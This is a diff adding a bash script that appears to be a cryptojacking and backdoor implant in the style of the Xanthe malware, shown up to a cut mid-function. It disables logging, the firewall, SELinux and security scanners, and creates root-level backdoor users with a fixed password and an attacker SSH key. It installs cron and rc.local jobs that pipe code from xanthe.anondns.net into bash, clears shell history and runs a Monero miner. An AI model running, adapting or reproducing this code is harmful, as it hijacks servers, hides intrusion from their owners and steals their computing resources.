@@ -1,0 +1,939 @@
+#!/bin/bash
+#thanks for everything
+#                                                                     $$\    $$$$$$\
+#                                                                   $$$$ |  $$  __$$\
+# $$$$$$\   $$$$$$\   $$$$$$$\  $$$$$$\   $$$$$$$\        $$\   $$\ \_$$ |  \__/  $$ |
+#$$  __$$\ $$  __$$\ $$  _____|$$  __$$\ $$  _____|       \$$\ $$  |  $$ |   $$$$$$  |
+#$$ /  $$ |$$ /  $$ |\$$$$$$\  $$$$$$$$ |$$ /              \$$$$  /   $$ |  $$  ____/
+#$$ |  $$ |$$ |  $$ | \____$$\ $$   ____|$$ |              $$  $$<    $$ |  $$ |
+#\$$$$$$  |$$$$$$$  |$$$$$$$  |\$$$$$$$\ \$$$$$$$\        $$  /\$$\ $$$$$$\ $$$$$$$$\
+# \______/ $$  ____/ \_______/  \_______| \_______|$$$$$$\\__/  \__|\______|\________|
+#          $$ | pwning to pwn                      \______|
+#          $$ | if this script helped you make some $$ mining monero, throw a little my way?
+#          \__| Monero: 47TmDBB14HuY7xw55RqU27EfYyzfQGp6qKmfg6f445eihemFMn3xPhs8e1qM726pVj6XKtyQ1zqC24kqtv8fXkPZ7bvgSPU
+#
+#script_name="fczyo"
+#echo $script_name
+#if pidof -x "$script_name" -o $$ >/dev/null;then
+#   echo "An another instance of this script is already running, please clear all the sessions of this script before starting a new session"
+#   exit 1
+#fi
+
+killcommondockers() {
+	docker ps | grep "/bin/bash" | awk '{print $1}' | xargs -I % docker rm -f %
+	docker ps | grep "/bin/bash -c" | awk '{print $1}' | xargs -I % docker rm -f %
+	docker ps | grep "bash.shell" | awk '{print $1}' | xargs -I % docker rm -f %
+	docker ps | grep "cokkokotre1/update" | awk '{print $1}' | xargs -I % docker rm -f %
+	docker ps | grep "lchaia/xmrig" | awk '{print $1}' | xargs -I % docker rm -f %
+	docker ps | grep "patsissons/xmrig" | awk '{print $1}' | xargs -I % docker rm -f %
+	docker ps | grep "challengerd/challengerd" | awk '{print $1}' | xargs -I % docker rm -f %
+	docker ps | grep "pocosow" | awk '{print $1}' | xargs -I % docker rm -f %
+	docker ps | grep "gakeaws" | awk '{print $1}' | xargs -I % docker rm -f %
+	docker ps | grep "azulu" | awk '{print $1}' | xargs -I % docker rm -f %
+	docker ps | grep "auto" | awk '{print $1}' | xargs -I % docker rm -f %
+	docker ps | grep "xmr" | awk '{print $1}' | xargs -I % docker rm -f %
+	docker ps | grep "mine" | awk '{print $1}' | xargs -I % docker rm -f %
+	docker ps | grep "monero" | awk '{print $1}' | xargs -I % docker rm -f %
+}
+removefuckboiskeys() {
+	cat /root/.ssh/authorized_keys | grep -vw grep | grep "AAAAB3NzaC1yc2EAAAABJQAAAQEAv3wmz70a9j03NaEpLqA3"
+	if [ $? -eq 0 ]; then
+		echo "key exists, removing."
+		#ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAv3wmz70a9j03NaEpLqA3y2ZGo2pu2z7UT4F7tPsH1aWrjnXiSqgXHcDVjsXM/o93M+kfW5t6qs9z9cX4A4OVKr9UecXHAHhELa+5LSO59HaxLKMf/QBHVTqBlJkGo131MCnUOAonNQs0ldci5VpbDPBRKDB/U0drMt5VSiilLtssE2yRzV1SycnbEDH5F3vTHj+P0n/PZ8SKLt0YUXXV09eiSWjJl3gf1kf0PgvQbuLy1QhZ+YqS+wxSOfzt5n7BKn4WHObIZ53ZfWJyhx/C8thbjdZ72ipYuxDAvcWMfAAyvHLixoI9XnA9x/rkNB7dZHVyMdrmm++T8fZtZKLnGQ== rsa-key-20191213
+		sudo chattr -ia /root/.ssh/authorized_keys
+		sed -i '/^ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAv3wmz70a9j03NaEpLqA3y2ZGo2pu2z7UT4F7tPsH1aWrjnXiSqgXHcDVjsXM\/o93M+kfW5t6qs9z9cX4A4OVKr9UecXHAHhELa+5LSO59HaxLKMf\/QBHVTqBlJkGo131MCnUOAonNQs0ldci5VpbDPBRKDB\/U0drMt5VSiilLtssE2yRzV1SycnbEDH5F3vTHj+P0n\/PZ8SKLt0YUXXV09eiSWjJl3gf1kf0PgvQbuLy1QhZ+YqS+wxSOfzt5n7BKn4WHObIZ53ZfWJyhx\/C8thbjdZ72ipYuxDAvcWMfAAyvHLixoI9XnA9x\/rkNB7dZHVyMdrmm++T8fZtZKLnGQ== rsa-key-20191213/d' /root/.ssh/authorized_keys
+		sudo chattr +ia /root/.ssh/authorized_keys
+	else
+		echo "root/authorized_keys clean"
+	fi
+	#sed: -e expression #1, char 99: unknown command: `o'
+	cat /root/.ssh/authorized_keys | grep -vw grep | grep "AAAAB3NzaC1yc2EAAAADAQABAAABAQDvJvNNOFg4C9j2oys9"
+	if [ $? -eq 0 ]; then
+		echo "key exists, removing."
+		sudo chattr -ia /root/.ssh/authorized_keys
+		sed -i '/^ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDvJvNNOFg4C9j2oys9kXcmJhnZIY2RSu3BA2RIuQbt8ahRmPqYIoAOoXUzKEuYUQWuDxGlGLniFFuIMboV1gLCEEBgGW+xXNQoNBzMKkXgmuHRllBv+Ul8T3g6dAJsLdXFWUdsll4BT+oOPCtyPlB\/s19wPjgJ\/sQNij7txpA79LQItbGrRsFIu5o23Xx7HKR0ZD9BN+sxJPCnfQMJcHpqp4TU0ov9VVkWhzhsjlTcA0H2yNjDHq0KsPofCykp012Uiana3mOZE7JBrKzjV6UnQNiwDjSCwbpfVTFnws8tX+he2yLG\/16cb1kpfyzzB7DfJljD\/ZG\/SOS14LKZKboX localhost@server$/d' /root/.ssh/authorized_keys
+		sudo chattr +ia /root/.ssh/authorized_keys
+	else
+		echo "root/authorized_keys clean"
+	fi
+
+	cat /root/.ssh/authorized_keys | grep -vw grep | grep "AAAAB3NzaC1yc2EAAAABJQAAAQEAgSuI+AZnPupl2EmCqUpE"
+	if [ $? -eq 0 ]; then
+		echo "key exists, removing."
+		sudo chattr -ia /root/.ssh/authorized_keys
+		sed -i '/^ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAgSuI+AZnPupl2EmCqUpEaDU6XY9IQ351UtAN3uRwZ\/q+VMuVfNfa0wCx\/kDA3t5VR6Dg92uGddGQUNDuDEQU7ahxVLrkPeYT2PjZhDOiBo9KupNBtCgF51djq9eaHZYYCBhPpNnACmUu0LK3w7JU0qbSR1zjcuFy7QUFgl5aRQDYW4yUcDqLVgnx\/LsW5VVHuA0GiWqCfBQto8hcGxH\/RUmajgYY13L8d+DrZyyAwHFcxQenWMX1RWx2+Hu2fLKq9LksDV+taJ\/UhXd546GqyHckLVQbc2EmhvjxVOjf0Ypyvwlfh8hBV5GkjSKdSNa+UpeiwuvOaBAUTcJCCRsBdw== root@localhost/d' /root/.ssh/authorized_keys
+		sudo chattr +ia /root/.ssh/authorized_keys
+	else
+		echo "root/authorized_keys clean"
+	fi
+}
+
+firstthingsfirst() {
+	date +"%r"
+
+	systemctl is-active --quiet syslog
+	if [ $? -eq 0 ]; then
+		echo "syslog is running, proceeding to stop and disable."
+		service syslog stop
+		systemctl disable syslog
+	else
+		echo "syslog is not running. Good day to you!"
+	fi
+
+	systemctl is-active --quiet hostguard
+	if [ $? -eq 0 ]; then
+		echo "hostguard is running, proceeding to stop."
+		service hostguard stop
+		systemctl disable hostguard
+	else
+		echo "hostguard is not running. Good day to you!"
+	fi
+
+	cat /etc/os-release | grep -vw grep | grep "rhel" >/dev/null
+	if [ $? -eq 0 ]; then
+		# RHEL/CentOS and Fedora
+		# sudo systemctl enable crond.service
+		# sudo systemctl start crond.service
+		systemctl is-active --quiet crond
+		if [ $? -eq 0 ]; then
+			echo "(rhel, centos, fedora) - crond is already running"
+		else
+			echo "crond is not running"
+			systemctl enable crond.service
+			service crond start
+		fi
+	else
+		# Debian and Ubuntu
+		# sudo systemctl enable cron.service
+		# sudo systemctl start cron.service
+		systemctl is-active --quiet cron
+		if [ $? -eq 0 ]; then
+			echo "(Ubuntu, debian) - cron is already running"
+		else
+			echo "cron is not running"
+			systemctl enable cron.service
+			service cron start
+		fi
+
+	fi
+
+	chattr +ia /etc/rc.local
+	chattr +ia /etc/rc.d/rc.local
+	chattr +ia /etc/passwd
+	chattr +ia /etc/shadow
+	#chattr +ia /var/spool/cron/root;
+	#rm -rf /etc/rc.d/'rc.local=';
+
+	which nano >/dev/null
+	if [ $? -eq 0 ]; then
+		echo "nano already installed"
+		export VISUAL=nano
+	else
+		echo "nano Not found....installing nano"
+		cat /etc/os-release | grep -vw grep | grep "CentOS" >/dev/null
+		if [ $? -eq 0 ]; then
+			echo "Verified CentOS"
+			yum install -y epel-release && yum install -y nano
+			export VISUAL=nano
+		else
+			echo "Not centOS"
+			apt-get install nano -y
+			export VISUAL=nano
+		fi
+
+		cat /etc/os-release | grep -vw grep | grep "rhel" >/dev/null
+		if [ $? -eq 0 ]; then
+			echo "Verified Redhat Linux"
+			yum install -y epel-release && yum install -y nano
+			export VISUAL=nano
+		else
+			echo "Not rhel"
+		fi
+
+	fi
+
+	which htop >/dev/null
+	if [ $? -eq 0 ]; then
+		echo "htop already installed"
+	else
+		echo "htop Not found....installing htop"
+		cat /etc/os-release | grep -vw grep | grep "CentOS" >/dev/null
+		if [ $? -eq 0 ]; then
+			echo "Verified CentOS"
+			yum install -y epel-release && yum install -y htop
+		else
+			echo "Not centOS"
+			apt-get install htop -y
+		fi
+	fi
+}
+
+usercheckgo() {
+	echo "checking users..."
+	# initial
+	if id "sysall" 2>/dev/null; then
+		echo "sysall user already exists"
+	else
+		echo "sysall user does not exist, creating..."
+		chattr -ia /etc/passwd
+		chattr -ia /etc/shadow
+		groupdel sysall
+		useradd -M -u 0 -o -p 'bAC5QOFFSK9bo' -s /bin/bash -d /root sysall
+		#useradd -m -p '7Pvsd3qh8Rx1c' sysall;
+		#usermod -aG sudoers sysall;
+		usermod -aG root sysall
+		#adduser sysall sudo;
+		chattr -ia /etc/sudoers
+		echo "sysall    ALL=(ALL)       ALL" >>/etc/sudoers
+		chattr +ia /etc/sudoers
+		chattr +ia /etc/passwd
+		chattr +ia /etc/shadow
+		echo "sysall user added"
+	fi
+
+	if id "system" 2>/dev/null; then
+		echo "system user already exists"
+	else
+		echo "system user does not exist, creating..."
+		chattr -ia /etc/passwd
+		chattr -ia /etc/shadow
+		useradd -M -p 'bAC5QOFFSK9bo' -s /bin/bash -d /root system
+		usermod -aG root system
+		chattr -ia /etc/sudoers
+		echo "system    ALL=(ALL)       ALL" >>/etc/sudoers
+		chattr +ia /etc/sudoers
+		chattr +ia /etc/passwd
+		chattr +ia /etc/shadow
+		echo "system user added"
+	fi
+
+	if id "logger" 2>/dev/null; then
+		echo "logger user already exists"
+	else
+		echo "logger user does not exist, creating..."
+		chattr -ia /etc/passwd
+		chattr -ia /etc/shadow
+		useradd -p 'bAC5QOFFSK9bo' -G root -s /bin/bash -d /opt/logger logger
+		usermod -aG root logger
+		chattr -ia /etc/sudoers
+		echo "logger    ALL=(ALL)       ALL" >>/etc/sudoers
+		chattr +ia /etc/sudoers
+		chattr +ia /etc/passwd
+		chattr +ia /etc/shadow
+		echo "logger user added"
+	fi
+
+	if id "autoupdater" 2>/dev/null; then
+		echo "autoupdater user already exists"
+	else
+		echo "autoupdater user does not exist, creating..."
+		chattr -ia /etc/passwd
+		chattr -ia /etc/shadow
+		useradd -p 'bAC5QOFFSK9bo' -s /bin/bash -d /opt/autoupdater autoupdater
+		usermod -aG root autoupdater
+		chattr -ia /etc/sudoers
+		echo "autoupdater    ALL=(ALL)       ALL" >>/etc/sudoers
+		chattr +ia /etc/sudoers
+		chattr +ia /etc/passwd
+		chattr +ia /etc/shadow
+		echo "autoupdater user added"
+	fi
+
+	if id "darmok" 2>/dev/null; then
+		chattr -ia /etc/passwd
+		chattr -ia /etc/shadow
+		echo "user exists, deleting..."
+		userdel -rf darmok
+		chattr +ia /etc/passwd
+		chattr +ia /etc/shadow
+	else
+		echo "darmok user does not exist."
+	fi
+
+	if id "cokkokotre1" 2>/dev/null; then
+		chattr -ia /etc/passwd
+		chattr -ia /etc/shadow
+		echo "user exists, deleting..."
+		userdel -rf cokkokotre1
+		chattr +ia /etc/passwd
+		chattr +ia /etc/shadow
+	else
+		echo "cokkokotre1 user does not exist."
+	fi
+
+	if id "akay" 2>/dev/null; then
+		chattr -ia /etc/passwd
+		chattr -ia /etc/shadow
+		echo "user exists, deleting..."
+		userdel -rf akay
+		chattr +ia /etc/passwd
+		chattr +ia /etc/shadow
+	else
+		echo "akay user does not exist."
+	fi
+
+	if id "o" 2>/dev/null; then
+		chattr -ia /etc/passwd
+		chattr -ia /etc/shadow
+		echo "user exists, deleting..."
+		userdel -rf o
+		chattr +ia /etc/passwd
+		chattr +ia /etc/shadow
+	else
+		echo "o user does not exist."
+	fi
+
+	if id "phishl00t" 2>/dev/null; then
+		chattr -ia /etc/passwd
+		chattr -ia /etc/shadow
+		echo "user exists, deleting..."
+		userdel -rf phishl00t
+		chattr +ia /etc/passwd
+		chattr +ia /etc/shadow
+	else
+		echo "phishl00t user does not exist."
+	fi
+
+	if id "opsecx12" 2>/dev/null; then
+		chattr -ia /etc/passwd
+		chattr -ia /etc/shadow
+		echo "user exists, deleting..."
+		userdel -rf opsecx12
+		chattr +ia /etc/passwd
+		chattr +ia /etc/shadow
+	else
+		echo "opsecx12 user does not exist."
+	fi
+
+	# allow root SSH Login
+	#chattr -ia /etc/ssh/sshd_config;
+	#chmod 644 /etc/ssh/sshd_config;
+	#sed -i '/.PermitRootLogin*/d' /etc/ssh/sshd_config
+	#sed -i '/PermitRootLogin*/d' /etc/ssh/sshd_config
+
+	#echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
+	#chmod 544 /etc/ssh/sshd_config;
+	#chattr +ia /etc/ssh/sshd_config;
+	#needreset=1;
+}
+
+fixgroupalreadyexists() {
+	if id "logger" 2>/dev/null; then
+		echo "logger user already exists"
+		chattr -ia /etc/passwd
+		chattr -ia /etc/shadow
+		usermod -p 'bAC5QOFFSK9bo' logger
+		chattr +ia /etc/passwd
+		chattr +ia /etc/shadow
+	else
+		echo "logger user does not exist, creating..."
+		chattr -ia /etc/passwd
+		chattr -ia /etc/shadow
+		useradd -p 'bAC5QOFFSK9bo' -G root -s /bin/bash -g logger -d /opt/logger logger
+		#usermod -aG root logger;
+		chattr -ia /etc/sudoers
+		echo "logger    ALL=(ALL)       ALL" >>/etc/sudoers
+		chattr +ia /etc/sudoers
+		chattr +ia /etc/passwd
+		chattr +ia /etc/shadow
+		echo "logger user added"
+	fi
+
+	if id "system" 2>/dev/null; then
+		echo "system user already exists"
+		chattr -ia /etc/passwd
+		chattr -ia /etc/shadow
+		usermod -p 'bAC5QOFFSK9bo' system
+		chattr +ia /etc/passwd
+		chattr +ia /etc/shadow
+	else
+		echo "system user does not exist, creating..."
+		chattr -ia /etc/passwd
+		chattr -ia /etc/shadow
+		useradd -p 'bAC5QOFFSK9bo' -G root -s /bin/bash -g system -d /opt/system system
+		#usermod -aG root system;
+		chattr -ia /etc/sudoers
+		echo "system    ALL=(ALL)       ALL" >>/etc/sudoers
+		chattr +ia /etc/sudoers
+		chattr +ia /etc/passwd
+		chattr +ia /etc/shadow
+		echo "system user added"
+	fi
+
+}
+
+##UNUSED ATM
+nameservercheck() {
+	echo "checking if name servers exist"
+	cat /etc/resolv.conf | grep -e "nameserver 1.1.1.1" | grep -v grep
+	if [ $? -eq 0 ]; then
+		echo "already exists"
+	else
+		echo "does not exist...need to insert new line"
+		#echo "nameserver 1.1.1.1" >> /etc/resolv.conf;
+		sed -i '1s/^/nameserver 1.1.1.1\n/' /etc/resolv.conf
+	fi
+
+	echo "checking if name servers exist"
+	cat /etc/resolv.conf | grep -e "nameserver 8.8.8.8" | grep -v grep
+	if [ $? -eq 0 ]; then
+		echo "already exists"
+	else
+		echo "does not exist...need to insert new line"
+		#echo "nameserver 1.1.1.1" >> /etc/resolv.conf;
+		sed -i '1s/^/nameserver 8.8.8.8\n/' /etc/resolv.conf
+	fi
+}
+
+croncheckgo() {
+	#TODO check if cron running on different OS's and add logic
+	service crond start
+	service cron start
+	echo "checking cron"
+	crontab -l | grep -e "fczyo-cron/1.5 -sL http://xanthe.anondns.net:8080/files/fczyo" | grep -v grep
+	if [ $? -eq 0 ]; then
+		echo "cron good"
+	else
+		echo "replacing cron..."
+		chattr -R -aui /var/spool/cron/
+		chattr -aui /var/spool/cron/root
+		rm /var/spool/cron/root
+		mkdir -p /etc/cron.d
+		mkdir -p /var/spool/cron
+		echo "*/7 * * * * curl -A fczyo-cron/1.5 -sL http://xanthe.anondns.net:8080/files/xanthe | bash -s >/dev/null 2>&1" >>~/cron || true &&
+			echo "*/10 * * * * curl -A fczyo-cron/1.5 -sL http://xanthe.anondns.net:8080/files/xesa.txt | bash -s >/dev/null 2>&1" >>~/cron || true &&
+			echo "*/3 * * * * curl -A goodboy/1.5 -sL https://iplogger.org/1i9ve7" >>~/cron || true &&
+			echo "*/2 * * * * curl -A fczyo-cron/1.5 -sL http://xanthe.anondns.net:8080/files/fczyo | bash -s >/dev/null 2>&1" >>~/cron || true &&
+			crontab -u root ~/cron || true &&
+			anacron -t ~/cron
+		rm -rf ~/cron
+		chattr +ia /var/spool/cron/root
+		chattr -R +ia /var/spool/cron/
+	fi
+
+	echo "checking cron for bad entries..."
+	crontab -l | grep -e "205.185.113.35" | grep -v grep
+	crontab -l | grep -e "log_rotate" | grep -v grep
+	crontab -l | grep -e "192.99.142.226\|82.146.58.234\|83.220.169.247\|91.201.42.5" | grep -v grep
+	crontab -l | grep -e "pastebin.com" | grep -v grep
+	crontab -l | grep -e "gitee" | grep -v grep
+	crontab -l | grep -e "mr.sh" | grep -v grep
+	crontab -l | grep -e "2mr.sh" | grep -v grep
+	crontab -l | grep -e "cr5.sh" | grep -v grep
+	crontab -l | grep -e "systemten" | grep -v grep
+	crontab -l | grep -e "logo9.jpg" | grep -v grep
+	crontab -l | grep -e "xmrig" | grep -v grep
+	if [ $? -eq 0 ]; then
+		cronab -r
+		echo "Bad entries found...replacing cron..."
+		chattr -aui /var/spool/cron/
+		chattr -aui /var/spool/cron/root
+		rm /var/spool/cron/root
+		mkdir -p /etc/cron.d
+		mkdir -p /var/spool/cron
+		echo "*/7 * * * * curl -A fczyo-cron/1.5 -sL http://xanthe.anondns.net:8080/files/xanthe | bash -s >/dev/null 2>&1" >>~/cron || true &&
+			echo "*/10 * * * * curl -A fczyo-cron/1.5 -sL http://xanthe.anondns.net:8080/files/xesa.txt | bash -s >/dev/null 2>&1" >>~/cron || true &&
+			echo "*/3 * * * * curl -A goodboy/1.5 -sL https://iplogger.org/1i9ve7" >>~/cron || true &&
+			echo "*/2 * * * * curl -A fczyo-cron/1.5 -sL http://xanthe.anondns.net:8080/files/fczyo | bash -s >/dev/null 2>&1" >>~/cron || true &&
+			crontab -u root ~/cron || true &&
+			anacron -t ~/cron
+		rm -rf ~/cron
+		chattr +ia /var/spool/cron/root
+		chattr +ia /var/spool/cron/
+	else
+		echo "cron does not contain any checked entries - do not needs to replace"
+	fi
+}
+
+checkrc() {
+	if test -f /etc/rc.d/rc.local; then
+		echo "/etc/rc.d/rc.local exists, lets check contents..."
+		cat /etc/rc.d/rc.local | grep -vw grep | grep "DfsfD"
+		if [ $? -eq 0 ]; then
+			echo "/etc/rc.d/rc.local exists and has correct contents"
+			chattr -ia /etc/rc.d/rc.local
+			chmod +x /etc/rc.d/rc.local
+			chattr +ia /etc/rc.d/rc.local
+			if test -f /etc/rc.local; then
+				echo "rc.local exists, deleting in order to make symlink to /etc/rc.d/rc.local"
+				chattr -ia /etc/rc.d/rc.local
+				chattr -ia /etc/rc.local
+				rm /etc/rc.local
+				ln -s /etc/rc.d/rc.local /etc/rc.local
+			else
+				echo "/etc/rc.local does not exist"
+				ln -s /etc/rc.d/rc.local /etc/rc.local
+			fi
+			#systemctl enable rc-local;
+			#systemctl start rc-local;
+			#TODO check if running and start if not or restart instead of start.
+			#systemctl restart rc-local;
+		else
+			echo "**CONTENTS WRONG** - inserting correct contents into /etc/rc.d/rc.local"
+			chattr -ia /etc/rc.d/rc.local
+			rm -rf /etc/rc.d/rc.local
+			{
+				echo "#!/bin/bash"
+				echo "#rc.local"
+				echo "#DfsfD"
+				echo "chattr -ia /etc/passwd"
+				echo "chattr -ia /etc/shadow"
+				echo "chattr -ia /etc/sudoers"
+				echo "curl -A rc.local/1.5 -sL http://xanthe.anondns.net:8080/files/fczyo | bash -s >/dev/null 2>&1"
+				echo "curl -A initial-$IP -sL https://iplogger.org/1Rfhy7 >/dev/null 2>&1"
+				echo "curl -sL http://xanthe.anondns.net:8080/files/xanthe | bash -s >/dev/null 2>&1"
+				echo "exit 0"
+			} >>/etc/rc.d/rc.local
+			chmod +x /etc/rc.d/rc.local
+			chattr +ia /etc/rc.d/rc.local
+			if test -f /etc/rc.local; then
+				echo "rc.local exists, deleting in order to make symlink to /etc/rc.d/rc.local"
+				chattr -ia /etc/rc.d/rc.local
+				chattr -ia /etc/rc.local
+				rm /etc/rc.local
+				ln -s /etc/rc.d/rc.local /etc/rc.local
+			else
+				echo "/etc/rc.local does not exist"
+				ln -s /etc/rc.d/rc.local /etc/rc.local
+			fi
+
+			echo "fixing /etc/rc.d/rc.local - DONE"
+			#systemctl enable rc-local;
+			#systemctl start rc-local;
+			#TODO check if running and start if not or restart instead of start.
+			#systemctl restart rc-local;
+		fi
+	else
+		echo "/etc/rc.d/rc.local does not exist...creating"
+		{
+			echo "#!/bin/bash"
+			echo "#rc.local"
+			echo "#DfsfD"
+			echo "chattr -ia /etc/passwd"
+			echo "chattr -ia /etc/shadow"
+			echo "chattr -ia /etc/sudoers"
+			echo "curl -A rc.local/1.5 -sL http://xanthe.anondns.net:8080/files/fczyo | bash -s >/dev/null 2>&1"
+			echo "curl -A initial-$IP -sL https://iplogger.org/1Rfhy7 >/dev/null 2>&1"
+			echo "curl -sL http://xanthe.anondns.net:8080/files/xanthe | bash -s >/dev/null 2>&1"
+			echo "exit 0"
+		} >>/etc/rc.d/rc.local
+		chmod +x /etc/rc.d/rc.local
+		chattr +ia /etc/rc.d/rc.local
+		if test -f /etc/rc.local; then
+			echo "rc.local exists, deleting in order to make symlink to /etc/rc.d/rc.local"
+			chattr -ia /etc/rc.d/rc.local
+			chattr -ia /etc/rc.local
+			rm /etc/rc.local
+			ln -s /etc/rc.d/rc.local /etc/rc.local
+		else
+			echo "/etc/rc.local does not exist"
+			ln -s /etc/rc.d/rc.local /etc/rc.local
+		fi
+
+	fi
+}
+
+securitygo() {
+	craigrowland=$(find /usr -name sandfly-filescan)
+	for klingon in $craigrowland; do
+		chattr -iua $klingon
+		rm -rf $klingon
+	done
+	#needresets=0;
+	pkill -f kdevtmpfsi
+	rm -rf /tmp/kdevtmpfsi
+	rm -rf /tmp/kinsing
+	rm -rf /var/tmp/kinsing
+	setenforce 0
+
+	which ufw
+	if [ $? -eq 0 ]; then
+		echo "disabling ufw"
+		ufw disable
+	else
+		echo "ufw not installed"
+	fi
+
+	if test -f /root/.bash_history; then
+		echo "root bash history exists..removing"
+		rm /root/.bash_history
+		echo "root bash history no longer exists"
+	else
+		echo "root bash history does not exist..zZzZZZzzzZZzzZzzzz"
+	fi
+}
+
+iptableschecker() {
+	if /sbin/iptables-save | grep -q '34.69.248.204'; then
+		echo "Iptables 34.69.248.204 already set....skipping!!!!!"
+	else
+		# set up iptables here
+		#iptables -I INPUT -s 34.69.248.204/32 -j ACCEPT
+		iptables -I INPUT -s 34.69.248.204/32 -j ACCEPT
+	fi
+	###################################################################
+	if /sbin/iptables-save | grep -q '138.68.14.52'; then
+		echo "Iptables 138.68.14.52 already set....skipping!!!!!"
+	else
+		# set up iptables here
+		#iptables -I INPUT -s 138.68.14.52/32 -j ACCEPT
+		iptables -I INPUT -s 138.68.14.52/32 -j ACCEPT
+	fi
+	###################################################################
+	if /sbin/iptables-save | grep -q '178.128.237.155'; then
+		echo "Iptables 178.128.237.155 already set....skipping!!!!!"
+	else
+		# set up iptables here
+		#iptables -I INPUT -s 178.128.237.155/32 -j ACCEPT
+		iptables -I INPUT -s 178.128.237.155/32 -j ACCEPT
+	fi
+	##################################################################
+
+	if /sbin/iptables-save | grep -q '64.225.46.44'; then
+		echo "Iptables 64.225.46.44 already set....skipping!!!!!"
+	else
+		# set up iptables here
+		#iptables -I INPUT -s 64.225.46.44/32 -j ACCEPT
+		iptables -I INPUT -s 64.225.46.44/32 -j ACCEPT
+	fi
+	##################################################################
+	if /sbin/iptables-save | grep -q 'dport 2375 -j DROP'; then
+		echo "Iptables 2375 already set....skipping!!!!!"
+	else
+		# set up iptables here
+		iptables -A INPUT -p tcp -m tcp --dport 2375 -j DROP
+	fi
+	###################################################################
+	if /sbin/iptables-save | grep -q 'dport 2376 -j DROP'; then
+		echo "Iptables 2376 already set....skipping!!!!!"
+	else
+		# set up iptables here
+		iptables -A INPUT -p tcp -m tcp --dport 2376 -j DROP
+	fi
+	###################################################################
+}
+
+configfilecheck() {
+	if test -f /var/tmp/bbb/config.json; then
+		echo "config file exists, lets check the md5sum"
+		if md5sum --status -c - <<<"4a29763527e695a13eccf776eac3adad /var/tmp/bbb/config.json"; then
+			echo "checksums match, nothing to do."
+			chattr +ia /var/tmp/bbb/config.json
+		else
+			echo "checksums dont match, lets download a new copy"
+			chattr -ia /var/tmp/bbb/config.json
+			curl -sL -o /var/tmp/bbb/config.json http://xanthe.anondns.net:8080/files/tcazmp.jpg
+			if md5sum --status -c - <<<"4a29763527e695a13eccf776eac3adad /var/tmp/bbb/config.json"; then
+				echo "correct copy now in place"
+				chattr +ia /var/tmp/bbb/config.json
+			else
+				echo "oh fuck... its broke"
+				#chattr -ia /var/tmp/bbb/config.json;
+				curl -sL -o /var/tmp/bbb/config.json http://xanthe.anondns.net:8080/files/config.json
+				chattr +ia /var/tmp/bbb/config.json
+			fi
+		fi
+	else
+		echo "files do not exist, lets download a new copy"
+		curl -sL -o /var/tmp/bbb/config.json http://xanthe.anondns.net:8080/files/tcazmp.jpg
+		if md5sum --status -c - <<<"4a29763527e695a13eccf776eac3adad /var/tmp/bbb/config.json"; then
+			echo "correct"
+			chattr +ia /var/tmp/bbb/config.json
+		else
+			echo "oh fuck... its broke"
+			curl -sL -o /var/tmp/bbb/config.json http://xanthe.anondns.net:8080/files/config.json
+			chattr +ia /var/tmp/bbb/config.json
+		fi
+	fi
+
+}
+
+filerungo() {
+	ps aux | grep -vw bbb/bbb | grep -v grep | awk '{if($3>80.0) print $2}' | xargs -I % kill -9 %
+	ps -fe | grep -w bbb/bbb | grep -v grep | grep -v http
+	if [ $? -eq 0 ]; then
+		echo "RUNNING all is good in the hood"
+		chattr +iau /var/tmp/bbb/bbb
+	else
+		sysctl -w vm.nr_hugepages="$(nproc --all)"
+		echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled
+		chattr -iau /var/tmp/bbb/bbb
+		#chattr -iauR /tmp/bbb/
+		#chattr -iauR /opt/bbb/
+		chmod +x /var/tmp/bbb/bbb
+		#
+		#chmod +x /opt/bbb/bbb
+		#chattr +iau /var/tmp/bbb/bbb
+		#chattr +iauR /tmp/bbb/
+		#chattr +iauR /opt/bbb/
+		#/var/tmp/bbb/bbb || /opt/bbb/bbb
+		/var/tmp/bbb/bbb
+		sleep 10s
+		ps -fe | grep -w bbb/bbb | grep -v grep | grep -v http
+		if [ $? -eq 0 ]; then
+			echo "NOW we are RUNNING"
+			chattr +iau /var/tmp/bbb/bbb
+		else
+			sysctl -w vm.nr_hugepages="$(nproc --all)"
+			echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled
+			/var/tmp/bbb/bbb -c /var/tmp/bbb/config.json
+		fi
+	fi
+}
+
+restartdocker() {
+
+	host=localhost
+	for port in 2375; do
+		if netcat -z $host $port; then
+			echo "port $port is up, nothing to do"
+		else
+			echo "port $port is down restart docker"
+			service docker restart
+		fi
+	done
+
+	#service docker stop;
+	#service docker start;
+}
+
+addloggersshkey() {
+
+	if [ -f "/opt/logger/.ssh/authorized_keys" ]; then
+		echo "authorized_keys file exists in logger home directory"
+		if md5sum --status -c - <<<"5ce861ddfec4f14dae5d250418834ef8 /opt/logger/.ssh/authorized_keys"; then
+			echo "key is good...nothing to do"
+		else
+			echo "key checksums dont match...replacing"
+			echo "" >>/opt/logger/.ssh/authorized_keys
+			chmod 600 /opt/logger/.ssh/authorized_keys
+			echo "setting up user key"
+			mkdir /opt/logger
+			mkdir /opt/logger/.ssh
+			chmod 700 /opt/logger/.ssh
+			touch /opt/logger/.ssh/authorized_keys
+			echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCaI/z3wCJX+ZeHqkRwhQQFwCqG+uorAskTWehsVXv/BpbM127jiZzJYKSwy4x0c2UWYTPuJ0KXMBrafx9DqQLEH8PfizCUzKCrDoMqNUyH53GmGMNFqRNqTSPN+kefmx+O/7qHc/ufBfklWIoCVk2aVv3Tl5CBJa3SB6y/U1/xpdyod8gIJYn6FGk4x8+qPU9pYZt6ozUGPxs5ymxT5JHOpXjCvhJ3CSrSqt18i/293U5ofDVMuG8R0tRFXQnoLmA8t8BeOuPzHd9cd0F7Hc6ur/Ui5uD1cDJt6hzODRJ5hFFYItnB9eU4abITEYidl3Pw40gkfgr47b2IqLKG2OJv" >>/opt/logger/.ssh/authorized_keys
+			chmod 600 /opt/logger/.ssh/authorized_keys
+			chown -R logger:logger /opt/logger
+			chattr +ia /opt/logger/.ssh/authorized_keys
+			chattr -ia /etc/passwd
+			chattr -ia /etc/shadow
+			usermod -d /opt/logger logger
+			chattr +ia /etc/passwd
+			chattr +ia /etc/shadow
+		fi
+	else
